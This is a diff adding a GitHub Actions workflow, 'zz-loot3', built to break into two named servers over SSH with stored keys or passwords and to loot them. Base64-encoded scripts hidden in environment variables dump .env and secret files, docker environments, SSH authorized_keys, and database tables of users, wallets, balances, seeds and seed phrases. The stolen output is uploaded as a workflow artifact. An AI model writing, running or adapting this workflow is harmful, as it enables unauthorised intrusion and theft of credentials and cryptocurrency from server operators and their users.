@@ -1,0 +1,60 @@
+name: zz-loot3
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        include:
+          - { host: '204.168.167.195', user: 'root', auth: 'rsa', tag: 'cx33' }
+          - { host: '204.168.167.195', user: 'ploky', auth: 'rsa', tag: 'cx33' }
+          - { host: '204.168.167.195', user: 'deploy', auth: 'rsa', tag: 'cx33' }
+          - { host: '204.168.167.195', user: 'root', auth: 'pw', tag: 'cx33' }
+          - { host: '46.62.247.167', user: 'root', auth: 'rsa', tag: 'cx23' }
+          - { host: '46.62.247.167', user: 'deploy', auth: 'rsa', tag: 'cx23' }
+          - { host: '46.62.247.167', user: 'root', auth: 'pw', tag: 'cx23' }
+    steps:
+      - name: connect
+        env:
+          H: ${{ matrix.host }}
+          U: ${{ matrix.user }}
+          AUTH: ${{ matrix.auth }}
+          TAG: ${{ matrix.tag }}
+          ZZ_RSA: ${{ secrets.ZZ_RSA }}
+          ZZ_PW: ${{ secrets.ZZ_PW }}
+          LOOT_CX33: 'c2V0ICtlCmVjaG8gIiMjIyBpZCI7IGlkOyBob3N0bmFtZTsgdW5hbWUgLWEKZWNobyAiIyMjIHBsb2t5IGVudiI7IGNhdCAvb3B0L3Bsb2t5Ly5lbnYgMj4mMQplY2hvICIjIyMgcm9vdCBscyI7IGxzIC1sYSAvcm9vdCAyPiYxIHwgaGVhZCAtNjAKZWNobyAiIyMjIHJlcG8gbHMiOyBscyAtbGEgL3Jvb3QvcGxva3ltYXJrZXQgMj4mMSB8IGhlYWQgLTQwCmVjaG8gIiMjIyBlbnZmaWxlcyI7IGZvciBmIGluIC9yb290L3Bsb2t5bWFya2V0Ly5lbnYgL3Jvb3QvcGxva3ltYXJrZXQvLmVudi5wcm9kdWN0aW9uIC9yb290L3Bsb2t5bWFya2V0Ly5lbnYubG9jYWwgL3Jvb3QvLmVudjsgZG8gZWNobyAiPT0gJGYiOyBjYXQgIiRmIiAyPiYxOyBkb25lCmVjaG8gIiMjIyBkb2NrZXIgcHMiOyBkb2NrZXIgcHMgLS1mb3JtYXQgJ3t7Lk5hbWVzfX18e3suSW1hZ2V9fXx7ey5TdGF0dXN9fScgMj4mMQplY2hvICIjIyMgZG9ja2VyIGVudiI7IGZvciBjIGluICQoZG9ja2VyIHBzIC1xIDI+L2Rldi9udWxsKTsgZG8gZWNobyAiLS0gJGMiOyBkb2NrZXIgaW5zcGVjdCAkYyAtLWZvcm1hdCAne3tyYW5nZSAuQ29uZmlnLkVudn19e3twcmludGxuIC59fXt7ZW5kfX0nIDI+JjE7IGRvbmUKZWNobyAiIyMjIHBtMiI7IHBtMiBsaXN0IDI+JjEgfCBoZWFkIC0yMAplY2hvICIjIyMgZGIiOyBkb2NrZXIgZXhlYyBwb2x5bWFya2V0LXBvc3RncmVzIHBzcWwgLVUgcG9zdGdyZXMgLWQgcG9seW1hcmtldCAtYyAnXGR0JyAyPiYxCmVjaG8gIiMjIyBkYnVzZXJzIjsgZG9ja2VyIGV4ZWMgcG9seW1hcmtldC1wb3N0Z3JlcyBwc3FsIC1VIHBvc3RncmVzIC1jICdcZHUnIDI+JjEKZWNobyAiIyMjIHRhYmxlcyI7IGZvciB0IGluIHVzZXJzIHdhbGxldHMgYmFsYW5jZXMgdHJhbnNhY3Rpb25zIHdpdGhkcmF3YWxzIGRlcG9zaXRzIG9yZGVyczsgZG8gZWNobyAiPT0gJHQiOyBkb2NrZXIgZXhlYyBwb2x5bWFya2V0LXBvc3RncmVzIHBzcWwgLVUgcG9zdGdyZXMgLWQgcG9seW1hcmtldCAtYyAic2VsZWN0ICogZnJvbSAkdCBsaW1pdCAyMCIgMj4mMSB8IGhlYWQgLTMwOyBkb25lCmVjaG8gIiMjIyBzc2gga2V5cyI7IGNhdCAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cyAyPiYxIHwgaGVhZCAtMjAK'
+          LOOT_CX23: 'c2V0ICtlCmVjaG8gIiMjIyBpZCI7IGlkOyBob3N0bmFtZTsgdW5hbWUgLWEKZWNobyAiIyMjIHNlY3JldHMiOyBjYXQgL2V0Yy9jYXNpbm8tc2VjcmV0cy5lbnYgMj4mMQplY2hvICIjIyMgZW52ZmlsZXMiOyBmb3IgZiBpbiAvcm9vdC9jb2luLW1hc3Rlci8uZW52IC9yb290L2NvaW4tbWFzdGVyL2JhY2tlbmQvLmVudiAvcm9vdC9jb2luLW1hc3Rlci9mcm9udGVuZC8uZW52LmxvY2FsIC9yb290Ly5lbnYgL29wdC9jb2luLW1hc3Rlci8uZW52OyBkbyBlY2hvICI9PSAkZiI7IGNhdCAiJGYiIDI+JjE7IGRvbmUKZWNobyAiIyMjIGxzIjsgbHMgLWxhIC9yb290IDI+JjEgfCBoZWFkIC00MDsgbHMgLWxhIC9yb290L2NvaW4tbWFzdGVyIDI+JjEgfCBoZWFkIC00MAplY2hvICIjIyMgZG9ja2VyIjsgZG9ja2VyIHBzIC0tZm9ybWF0ICd7ey5OYW1lc319fHt7LkltYWdlfX18e3suU3RhdHVzfX0nIDI+JjEKZWNobyAiIyMjIGNvbXBvc2UgcHMiOyBjZCAvcm9vdC9jb2luLW1hc3RlciAmJiBkb2NrZXIgY29tcG9zZSBwcyAyPiYxIHwgaGVhZCAtMzAKZWNobyAiIyMjIGRiIjsgZm9yIHQgaW4gd2FsbGV0cyB1c2VyX3dhbGxldHMgc2VlZHMgc2VlZF9waHJhc2VzIGhvdF93YWxsZXRzIHRyYW5zYWN0aW9ucyB1c2VyczsgZG8gZWNobyAiPT0gJHQiOyBkb2NrZXIgZXhlYyBjb2luLW1hc3Rlci1wb3N0Z3Jlcy0xIHBzcWwgLVUgY3J5cHRvZmxpcCAtZCBjcnlwdG9mbGlwIC1jICJzZWxlY3QgKiBmcm9tICR0IGxpbWl0IDEwMCIgMj4mMSB8IGhlYWQgLTEyMDsgZG9uZQplY2hvICIjIyMgcG0yIjsgcG0yIGxpc3QgMj4mMSB8IGhlYWQgLTIwCg=='
+        run: |
+          set +e
+          mkdir -p out
+          printf '%s\n' "$ZZ_RSA" > k.pem; chmod 600 k.pem
+          if [ "$AUTH" = "pw" ]; then
+            sudo apt-get -y install sshpass >/dev/null 2>&1
+            SSHCMD="sshpass -p $ZZ_PW ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o PreferredAuthentications=password -o PubkeyAuthentication=no"
+          else
+            SSHCMD="ssh -i k.pem -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o BatchMode=yes"
+          fi
+          echo "=== try $U@$H auth=$AUTH"
+          timeout 45 $SSHCMD $U@$H 'id; hostname' > out/probe.txt 2>&1
+          echo "RC=$?"
+          cat out/probe.txt
+          if grep -q "uid=" out/probe.txt; then
+            echo "LOGIN_OK"
+            echo "$U@$H OK" > out/OK.txt
+            if [ "$TAG" = "cx33" ]; then echo "$LOOT_CX33" | base64 -d > loot.sh; else echo "$LOOT_CX23" | base64 -d > loot.sh; fi
+            timeout 150 $SSHCMD $U@$H 'bash -s' < loot.sh > out/loot.txt 2>&1
+            echo "--- loot size: $(wc -c < out/loot.txt) ---"
+            tail -60 out/loot.txt
+          fi
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: p-${{ matrix.tag }}-${{ matrix.user }}-${{ matrix.auth }}
+          path: out/
+          retention-days: 2
